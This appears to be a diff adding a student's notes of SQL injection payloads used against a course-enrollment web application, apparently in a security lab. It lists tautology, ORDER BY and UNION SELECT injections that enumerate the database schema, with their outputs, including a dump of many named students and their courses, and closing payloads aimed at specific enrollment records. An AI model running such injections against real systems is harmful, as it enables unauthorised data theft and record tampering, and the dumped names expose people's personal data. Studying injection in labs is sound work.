@@ -1,0 +1,22 @@
+' OR 1 =1; #
+
+' order by 1; #			output: No courses found for this student.
+' order by 2; #                	output: Error: SQLSTATE[42S22]: Column not found: 1054 Unknown column '2' in 'order clause'
+' union select group_concat(table_name) from information_schema.tables where table_schema=database(); #		output: courses,enrollments,students
+' union select group_concat(column_name) from information_schema.columns where table_name='enrollments'; #	output: id,student_name,course_name,enrollment_date,grade
+' union select student_name from enrollments; #
+
+
+' union select concat(student_name, " -> ", course_name) from enrollments; #
+output:
+Farriha AfnanDatabase,Farriha AfnanComputer Security,Rafiqul Islam RayanSoftware Engineering,Rafiqul Islam RayanComputer Networks,Abid Hasan KhondakerOperating System,Abid Hasan KhondakerArtificial Intelligence,Tahsin Kabir MazumderDatabase,Tahsin Kabir MazumderMachine Learning,Abdullah FaiyazComputer Graphics,Abdullah FaiyazCompiler,Masnoon MuztahidData Structures and Algorithms II,Masnoon MuztahidTheory of Computation,Md. Sumon HossainComputer Architecture,Md. Sumon HossainDatabase,Souvik MandolWireless Networks,Souvik MandolHuman Computer Interaction,Md. Irtiaz KabirSoftware Engineering,Md. Irtiaz KabirComputer Security,Sagor ChandaMachine Learning,Sagor ChandaAlgorithm Engineering,Abrar Rahman AbirDatabase,Abrar Rahman AbirData Communication,Shanto MondolComputer Networks,Shanto MondolBasic Graph Theory,Dipanta Kumar Roy NoboArtificial Intelligence,Dipanta Kumar Roy NoboComputer Graphics,Moyen UddinOperating System,Moyen UddinSimulation and Modeling,S. M. Kausar ParvejDatabase,S. M. Kausar ParvejSoftware 
+
+
+
+'; #
+' Union select 1; #
+' Union select id from enrollments where student_name="Sadatul Islam Sadi" and course_name="Database"; #
+' Union select id from enrollments where student_name="Farriha Afnan" and course_name="Database"; #
+Database' AND student_name='Farriha Afnan
+Computer Networks' AND student_name='Shanto Mondol
+
